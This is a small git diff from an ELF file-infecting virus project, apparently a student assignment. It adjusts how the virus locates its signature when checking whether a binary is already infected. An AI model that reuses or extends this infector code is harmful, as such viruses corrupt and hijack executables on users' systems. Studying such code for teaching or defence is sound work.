@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 00:13:40 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 01:31:59 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,7 +26,8 @@ static bool	not_infected(const struct entry *original_entry, \
 {
 	const Elf64_Off	sh_offset        = original_entry->safe_shdr->sh_offset;
 	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
-	const size_t	signature_offset = entry_offset + CALL_INSTR_SIZE + sizeof(struct virus_header);
+	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
+	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
 	char	 	*signature       = safe(ref, signature_offset, SIGNATURE_LEN);
 
 	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);
